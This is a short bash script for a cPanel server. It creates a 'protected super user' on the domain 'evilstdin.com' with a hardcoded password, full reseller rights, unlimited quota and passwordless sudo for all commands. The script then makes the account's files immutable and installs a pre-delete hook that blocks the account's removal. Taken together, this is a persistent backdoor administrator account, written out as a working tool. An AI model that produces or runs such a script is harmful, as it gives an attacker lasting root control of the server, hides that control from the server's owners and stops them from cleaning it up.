#!/bin/bash


USERNAME="adminuser"
DOMAIN="evilstdin.com"
PASSWORD="Qwee123123@#"

echo "Creating protected super user: $USERNAME"


/scripts/wwwacct $USERNAME $DOMAIN $PASSWORD


/scripts/resellerstats $USERNAME
echo "acl-all=1" > /var/cpanel/resellers/$USERNAME


/scripts/modifyacct $USERNAME QUOTA=unlimited BWLIMIT=unlimited


echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USERNAME
chmod 0440 /etc/sudoers.d/$USERNAME


chattr +i /var/cpanel/users/$USERNAME
chattr +i /home/$USERNAME


cat > /usr/local/cpanel/scripts/pre_killacct << EOFHOOK
#!/bin/bash
if [ "\$1" = "$USERNAME" ]; then
    echo "ERROR: Account $USERNAME is protected!"
    exit 1
fi
exit 0
EOFHOOK
chmod +x /usr/local/cpanel/scripts/pre_killacct

echo "Done! User $USERNAME created and protected."
echo "Test deletion protection with: /scripts/killacct $USERNAME"
